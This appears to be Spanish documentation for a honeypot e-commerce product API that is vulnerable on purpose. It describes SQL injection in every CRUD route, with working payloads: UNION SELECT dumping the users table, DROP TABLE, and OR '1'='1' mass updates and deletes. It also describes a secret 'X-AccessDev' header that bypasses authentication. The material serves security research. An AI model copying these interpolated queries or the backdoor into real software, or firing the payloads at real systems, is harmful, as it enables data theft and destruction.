# API de Productos - Documentación

## Rutas Implementadas

### Rutas Públicas (sin autenticación)

#### 1. GET /api/productos

Obtener todos los productos

**Request:**

```bash
GET http://localhost:3000/api/productos
```

**Response:**

```json
{
    "success": true,
    "count": 6,
    "products": [
        {
            "id": 1,
            "nombre": "Sofá Moderno",
            "descripcion": "Sofá de 3 plazas en tela gris",
            "precio": "45999.99",
            "stock": 15,
            "categoria": "sala",
            "imagen_url": "/images/sofa-moderno.jpg",
            "is_active": 1,
            "created_at": "2025-12-05T00:28:37.000Z",
            "updated_at": "2025-12-05T00:28:37.000Z"
        }
    ]
}
```

#### 2. GET /api/productos/:id

Obtener un producto por ID

**Request:**

```bash
GET http://localhost:3000/api/productos/1
```

**Response:**

```json
{
    "success": true,
    "product": {
        "id": 1,
        "nombre": "Sofá Moderno",
        "descripcion": "Sofá de 3 plazas en tela gris",
        "precio": "45999.99",
        "stock": 15,
        "categoria": "sala",
        "imagen_url": "/images/sofa-moderno.jpg"
    }
}
```

**VULNERABLE - SQL Injection:**

```bash
# Obtener todos los productos
GET /api/productos/1' OR '1'='1

# Obtener usuarios desde la tabla products
GET /api/productos/1' UNION SELECT id,username,email,password,role,is_active,created_at,updated_at FROM users--
```

#### 3. GET /api/productos/search/:term

Buscar productos por nombre o descripción

**Request:**

```bash
GET http://localhost:3000/api/productos/search/sofá
```

**Response:**

```json
{
  "success": true,
  "count": 1,
  "searchTerm": "sofá",
  "products": [...]
}
```

**VULNERABLE - SQL Injection:**

```bash
# Obtener todos los productos
GET /api/productos/search/x' OR '1'='1

# Obtener usuarios
GET /api/productos/search/x' UNION SELECT * FROM users--
```

---

### Rutas Protegidas (requieren autenticación ADMIN o Backdoor)

#### 4. POST /api/productos

Crear un nuevo producto (ADMIN only)

**Con Token Admin:**

```bash
POST http://localhost:3000/api/productos
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json

{
  "nombre": "Armario Moderno",
  "descripcion": "Armario de 4 puertas",
  "precio": 35000.00,
  "stock": 5,
  "categoria": "dormitorio",
  "imagen_url": "/images/armario.jpg"
}
```

**Con Backdoor (SIN Token):**

```bash
POST http://localhost:3000/api/productos
X-AccessDev: Testing-Mode
Content-Type: application/json

{
  "nombre": "Mesa de Noche",
  "descripcion": "Mesa de noche con 2 cajones",
  "precio": 4500.00,
  "stock": 15
}
```

**Response:**

```json
{
    "success": true,
    "message": "Product created successfully",
    "productId": 7,
    "product": {
        "id": 7,
        "nombre": "Mesa de Noche",
        "descripcion": "Mesa de noche con 2 cajones",
        "precio": 4500.0,
        "stock": 15,
        "imagen_url": ""
    }
}
```

**VULNERABLE - SQL Injection en INSERT:**

```bash
POST /api/productos
X-AccessDev: Testing-Mode
Content-Type: application/json

{
  "nombre": "Test'); DROP TABLE products;--",
  "precio": 1.00
}
```

#### 5. PUT /api/productos/:id

Actualizar un producto (ADMIN only)

**Con Backdoor:**

```bash
PUT http://localhost:3000/api/productos/1
X-AccessDev: Testing-Mode
Content-Type: application/json

{
  "precio": 50000.00,
  "stock": 20
}
```

**Response:**

```json
{
    "success": true,
    "message": "Product updated successfully",
    "productId": "1"
}
```

**VULNERABLE - SQL Injection en UPDATE:**

```bash
# Cambiar precio de TODOS los productos
PUT /api/productos/1' OR '1'='1
X-AccessDev: Testing-Mode
Content-Type: application/json

{
  "precio": 1.00
}
```

#### 6. DELETE /api/productos/:id

Eliminar un producto (ADMIN only)

**Con Backdoor:**

```bash
DELETE http://localhost:3000/api/productos/6
X-AccessDev: Testing-Mode
```

**Response:**

```json
{
    "success": true,
    "message": "Product deleted successfully",
    "productId": "6"
}
```

**VULNERABLE - SQL Injection en DELETE:**

```bash
# Eliminar TODOS los productos
DELETE /api/productos/1' OR '1'='1
X-AccessDev: Testing-Mode
```

---

## Productos Iniciales en la Base de Datos

La base de datos viene con 12 productos pre-cargados basados en las imágenes reales:

### Sala de Estar (4 productos)

| ID  | Nombre                   | Precio     | Stock | Imagen                       |
| --- | ------------------------ | ---------- | ----- | ---------------------------- |
| 1   | Sofá Patagonia           | $89,999.99 | 8     | Sofá Patagonia.png           |
| 2   | Sillón Copacabana        | $45,900.00 | 12    | Sillón Copacabana.png        |
| 3   | Butaca Mendoza           | $38,500.00 | 15    | Butaca Mendoza.png           |
| 4   | Mesa de Centro Araucaria | $24,900.00 | 20    | Mesa de Centro Araucaria.png |

### Comedor (3 productos)

| ID  | Nombre             | Precio     | Stock | Imagen                 |
| --- | ------------------ | ---------- | ----- | ---------------------- |
| 5   | Mesa Comedor Pampa | $65,000.00 | 6     | Mesa Comedor Pampa.png |
| 6   | Sillas Córdoba     | $42,000.00 | 10    | Sillas Córdoba.png     |
| 7   | Aparador Uspallata | $52,000.00 | 5     | Aparador Uspallata.png |

### Dormitorio (2 productos)

| ID  | Nombre                  | Precio     | Stock | Imagen                      |
| --- | ----------------------- | ---------- | ----- | --------------------------- |
| 8   | Cama Neuquén            | $78,500.00 | 8     | Cama Neuquén.png            |
| 9   | Mesa de Noche Aconcagua | $18,900.00 | 18    | Mesa de Noche Aconcagua.png |

### Oficina (3 productos)

| ID  | Nombre                    | Precio     | Stock | Imagen                        |
| --- | ------------------------- | ---------- | ----- | ----------------------------- |
| 10  | Escritorio Costa          | $55,000.00 | 10    | Escritorio Costa.png          |
| 11  | Silla de Trabajo Belgrano | $32,000.00 | 25    | Silla de Trabajo Belgrano.png |
| 12  | Biblioteca Recoleta       | $48,500.00 | 7     | Biblioteca Recoleta.png       |

---

## Archivos Creados

### Backend

1. **src/controllers/productController.js** - Controlador con todas las vulnerabilidades
2. **src/routes/productRoutes.js** - Rutas de productos con backdoor middleware
3. **requests/products.rest** - 25 tests incluyendo SQL injection
4. **src/database/schema.sql** - Actualizado con tabla products

### Cambios en server.js

```javascript
import productRoutes from "./routes/productRoutes.js";

// Rutas de productos (públicas y vulnerables a SQL injection)
app.use("/api/productos", productRoutes);
```

---

## Vulnerabilidades Implementadas

### 1. SQL Injection en GET by ID

```sql
-- Query vulnerable
SELECT * FROM products WHERE id = '${id}'

-- Exploit
GET /api/productos/1' OR '1'='1
```

### 2. SQL Injection en SEARCH

```sql
-- Query vulnerable
SELECT * FROM products WHERE name LIKE '%${term}%' OR description LIKE '%${term}%'

-- Exploit
GET /api/productos/search/x' UNION SELECT * FROM users--
```

### 3. SQL Injection en INSERT

```sql
-- Query vulnerable
INSERT INTO products (name, description, price, stock, image_url)
VALUES ('${name}', '${description}', ${price}, ${stock}, '${image_url}')

-- Exploit
POST /api/productos
{
  "nombre": "Test'); DROP TABLE products;--",
  "precio": 1
}
```

### 4. SQL Injection en UPDATE

```sql
-- Query vulnerable
UPDATE products SET price = ${price} WHERE id = '${id}'

-- Exploit
PUT /api/productos/1' OR '1'='1
{
  "precio": 1
}
```

### 5. SQL Injection en DELETE

```sql
-- Query vulnerable
DELETE FROM products WHERE id = '${id}'

-- Exploit
DELETE /api/productos/1' OR '1'='1
```

### 6. Bypass de Autenticación con Backdoor

```bash
# Sin token, usando header secreto
X-AccessDev: Testing-Mode

# Permite crear, actualizar y eliminar productos sin autenticación
```

---

## Testing Rápido

### Desde VS Code REST Client

Abrir `requests/products.rest` y ejecutar cualquier test.

### Desde PowerShell

```powershell
# GET todos los productos
curl.exe http://localhost:3000/api/productos

# GET producto por ID
curl.exe http://localhost:3000/api/productos/1

# SQL Injection
curl.exe "http://localhost:3000/api/productos/1' OR '1'='1"

# Crear producto con backdoor
curl.exe -X POST http://localhost:3000/api/productos `
  -H "Content-Type: application/json" `
  -H "X-AccessDev: Testing-Mode" `
  -d '{\"nombre\":\"Test\",\"precio\":100}'
```

### Desde el Frontend

El frontend ahora debería cargar automáticamente los productos en:

```
http://localhost:5173/productos
```

---

## Notas de Seguridad

**TODAS estas vulnerabilidades son INTENCIONALES para el honeypot:**

1. Rutas públicas sin autenticación exponen todos los productos
2. SQL Injection permite leer la tabla `users`
3. SQL Injection permite modificar/eliminar productos
4. Backdoor bypass permite CRUD sin autenticación
5. Sin paginación (puede exponer millones de registros)
6. Sin rate limiting
7. Sin validación de tipos de datos

---

## Próximos Pasos

-   El frontend debería mostrar los productos ahora
-   Probar login desde frontend
-   Probar agregar productos al carrito
-   Documentar exploits en EXPLOITATION_GUIDE.md
